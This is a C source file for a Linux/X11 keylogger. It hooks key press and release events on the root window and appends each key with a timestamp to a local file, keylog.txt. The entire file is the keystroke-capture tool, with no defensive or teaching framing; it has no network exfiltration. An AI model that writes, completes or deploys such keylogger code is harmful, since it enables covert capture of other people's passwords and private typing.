#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/Xutil.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

// Function to log key events to a file
void log_key(const char *event, const char *key) {
    FILE *logfile = fopen("keylog.txt", "a");
    if (logfile == NULL) {
        perror("Error opening log file");
        exit(1);
    }

    // Get current timestamp
    time_t now = time(NULL);
    struct tm *timeinfo = localtime(&now);

    // Write timestamp and key event to the log
    fprintf(logfile, "%02d-%02d-%04d %02d:%02d:%02d - %s: %s\n", 
        timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900,
        timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec, event, key);

    fclose(logfile);
}

// Function to get a string representation of the key
char* get_key_string(XKeyEvent *event) {
    static char buf[128];
    KeySym keysym;
    int len;

    // Use XLookupString instead of Xutf8LookupString for simplicity
    len = XLookupString(event, buf, sizeof(buf), &keysym, NULL);

    if (len > 0) {
        buf[len] = '\0';
        return buf;
    } else {
        return XKeysymToString(keysym);
    }
}

int main() {
    Display *display;
    Window root;
    XEvent event;

    // Open connection to X server
    display = XOpenDisplay(NULL);
    if (display == NULL) {
        fprintf(stderr, "Cannot open display\n");
        exit(1);
    }

    root = DefaultRootWindow(display);

    // Select input events for the root window
    XSelectInput(display, root, KeyPressMask | KeyReleaseMask);

    printf("Keylogger started. You can use the keyboard.\n");

    // Main loop to capture key events
    while (1) {
        XNextEvent(display, &event);
        if (event.type == KeyPress) {
            char *key = get_key_string(&event.xkey);
            log_key("Key Pressed", key);
        } else if (event.type == KeyRelease) {
            char *key = get_key_string(&event.xkey);
            log_key("Key Released", key);
        }
    }

    XCloseDisplay(display);
    return 0;
}
